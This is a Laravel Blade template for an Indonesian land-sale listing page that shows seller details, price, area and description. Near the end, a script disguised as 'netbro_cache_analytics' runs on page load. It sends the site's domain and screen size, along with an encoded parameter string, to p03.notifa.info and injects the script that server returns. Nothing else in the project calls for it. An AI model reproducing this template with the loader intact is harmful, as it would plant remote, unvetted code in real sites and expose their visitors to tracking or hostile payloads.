<!doctype html>
<html class="no-js" lang="zxx">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta content="width=device-width, initial-scale=1" name="viewport" />
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Detail Lahan</title>
    <!-- Favicon-->

    <link rel="apple-touch-icon" href="{{ asset('assets/landingpage/images/apple-touch-icon.png') }}">
    <link rel="shortcut icon" type="image/ico" href="{{ asset('assets/landingpage/images/favicon.ico') }}" />
    <link rel="stylesheet" href="{{ asset('assets/landingpage/css/owl.carousel.min.css') }}">
    <link rel="stylesheet" href="{{ asset('assets/landingpage/css/themify-icons.css') }}">
    <link rel="stylesheet" href="{{ asset('assets/landingpage/css/animate.css') }}">
    <link rel="stylesheet" href="{{ asset('assets/landingpage/css/magnific-popup.css') }}">
    <link rel="stylesheet" href="{{ asset('assets/landingpage/css/space.css') }}">
    <link rel="stylesheet" href="{{ asset('assets/landingpage/css/theme.css') }}">
    <link rel="stylesheet" href="{{ asset('assets/landingpage/css/overright.css') }}">
    <link rel="stylesheet" href="{{ asset('assets/landingpage/css/normalize.css') }}">
    <link rel="stylesheet" href="{{ asset('assets/landingpage/style.css') }}">
    <link rel="stylesheet" href="{{ asset('assets/landingpage/css/responsive.css') }}">
    <script src="{{ asset('assets/landingpage/js/vendor/modernizr-2.8.3.min.js') }}"
        type="e763a39d6fa7d0f8e02806d7-text/javascript"></script>
    <link rel="icon" href="{{ asset('assets/images/favicon.ico') }}" type="image/x-icon">


    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">

    <!-- Plugins Core Css -->
    <link href="{{ asset('assets/css/app.min.css') }}" rel="stylesheet">

    <!-- Custom Css -->
    <link href="{{ asset('assets/user/css/shop-item.css') }}" rel="stylesheet">
    <link href="{{ asset('assets/css/style.css') }}" rel="stylesheet" />

    <!-- Theme style. You can choose a theme from css/themes instead of get all themes -->
    <link href="{{ asset('assets/css/styles/all-themes.css') }}" rel="stylesheet" />
    <link href="{{ asset('assets/css/pages/extra_pages.css') }}" rel="stylesheet" />
    <!-- <link href="{{ asset('/dist/css/sweetalert.css') }}" rel="stylesheet"> -->

    <!-- <script src="{{ asset('js/app.js') }}"></script> -->
    <script src="{{ asset('assets/user/jquery/jquery.min.js') }}"></script>
    <script src="{{ asset('assets/js/app.min.js') }}"></script>

    <!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> -->
    <!-- <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script> -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/6.6.9/sweetalert2.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/6.6.9/sweetalert2.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/apexcharts"></script>

    <script src='https://api.mapbox.com/mapbox-gl-js/v1.11.0/mapbox-gl.js'></script>
    <link href='https://api.mapbox.com/mapbox-gl-js/v1.11.0/mapbox-gl.css' rel='stylesheet' />
</head>

<body class="light">
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark fixed-top">
        <div class="container">
        </div>
    </nav>

    <div class="container-fluid" style="margin-top: 90px">
        <div class="block-header">
            <div class="row">
                <section>
                    <div class="card-body">
                        <div class="product-store">
                            <div class="row">
                                <div class="col-xl-6 col-lg-6 col-md-12 col-sm-12">
                                    <div class="product-gallery">
                                        <div class="product-gallery-thumbnails">
                                            <ol class="thumbnails-list list-unstyled">
                                                @foreach($lahan->images as $dp)
                                                <li><img src="{{asset($dp->foto)}}" alt=""></li>
                                                @endforeach
                                            </ol>
                                        </div>
                                        <div class="product-gallery-featured">

                                            @foreach($lahan->images as $dp)
                                            <img src="{{asset($dp->foto)}}" alt="" style="width: 400px; height: 200px;">
                                            @break
                                            @endforeach
                                        </div>
                                    </div>
                                </div>
                                <div class="col-xl-6 col-lg-6 col-md-12 col-sm-12">
                                    <div class="product-description">
                                        <dl class="row mb-5">
                                            <dt class="col-sm-3">Nama Penjual</dt>
                                            <dd class="col-sm-9">{{ $lahan->user->name }}</dd>

                                            <dt class="col-sm-3">Harga</dt>
                                            <dd class="col-sm-9">Rp.
                                                {{number_format($lahan->harga_lahan,0,',','.')}}</dd>

                                            <dt class="col-sm-3">Judul Lahan</dt>
                                            <dd class="col-sm-9">{{$lahan->judul_lahan}}</dd>

                                            <dt class="col-sm-3">Luas Lahan</dt>
                                            <dd class="col-sm-9">{{$lahan->luas_lahan}} M2</dd>

                                            <dt class="col-sm-3">Jenis Lahan</dt>
                                            <dd class="col-sm-9">{{$lahan->jenis_lahan}}</dd>

                                            <dt class="col-sm-3">Sertifikat</dt>
                                            <dd class="col-sm-9">{{$lahan->sertifikat}}</dd>

                                            <dt class="col-sm-3">Alamat</dt>
                                            <dd class="col-sm-9">{{$lahan->alamat}}</dd>

                                            <dt class="col-sm-3">No Penjual</dt>
                                            <dd class="col-sm-9">{{$lahan->no_hp}}</dd>


                                            <dt class="col-sm-3">Deskripsi</dt>
                                            <dd class="col-sm-9">{{$lahan->deskripsi}}</dd>
                                        </dl>
                                        <br>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>
            </div>
        </div>
    </div>


    <!-- Plugins Js -->

    <!-- <script src="{{ asset('assets/js/app.min.js') }}"></script> -->

    <script src="{{ asset('assets/js/chart.min.js') }}"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>

    <!-- Custom Js -->
    <script src="{{ asset('assets/js/pages/tables/jquery-datatable.js') }}"></script>
    <script src="{{ asset('assets/js/table.min.js') }}"></script>

    <script src="{{ asset('assets/js/map.min.js') }}"></script>
    <script src="{{ asset('assets/js/pages/examples/pages.js') }}"></script>
    <script src="{{ asset('assets/js/admin.js') }}"></script>
    <script src="{{ asset('assets/js/pages/index.js') }}"></script>
    <script src="{{ asset('assets/js/pages/charts/jquery-knob.js') }}"></script>
    <script src="{{ asset('assets/js/pages/sparkline/sparkline-data.js') }}"></script>
    <script src="{{ asset('assets/js/pages/medias/carousel.js') }}"></script>
    <script src="{{ asset('assets/js/pages/maps/jqvmap.js') }}"></script>
    <script type="text/javascript">
    if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function() {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) {
            fn();
        }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" +
                "&params=" +
                "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXnjWASTgP5hscpNwuITBqiveh7Po09jZWTixOajSHEd%2bUM5viQkc16v5bfbuhl5RiGklfKf7DdoWxG5aUK2GudwbmYBF0YQ%2bcoURI6EE9w2FsRNqyDE4C8uKttpdr%2bZ61s7YmRpj%2f0p%2bX%2fMcNA4pBLS0CE7GOL7fdnC9nAEZnTONbZZiakda0jWPnXW5dJLh0DIli8%2fuhtOkMU6zZSoKF%2fAyGu45A%2byws1f%2fuwY%2b6EEtgKLbsXXPExbXc8aCyU65cNUnFgdmErEuwEeBg7gEEIYp4xtY4aaCab%2fueuSm5u5EmNK5MHbTPnq%2fzxwXPihwhvv0X7tYUWwrD5nMY8EY3pc1JqgpI447H4Gys5hKy7VjavtihwEff%2bwwnPw7zuTjto5Wd5EuryTwhOn6GeA2HEj%2fRQb0%2feetpeVCinRkEGoVPUpnDWO5dLrQri701SV67BFr7sXh4V1dsy0B5JoDB7jtVHA%2fVK2cP" +
                "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" +
                screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0])
            .appendChild(bsa);
        }
        netbro_cache_analytics(requestCfs, function() {});
    };
    </script>

    @yield('script')

</body>

</html>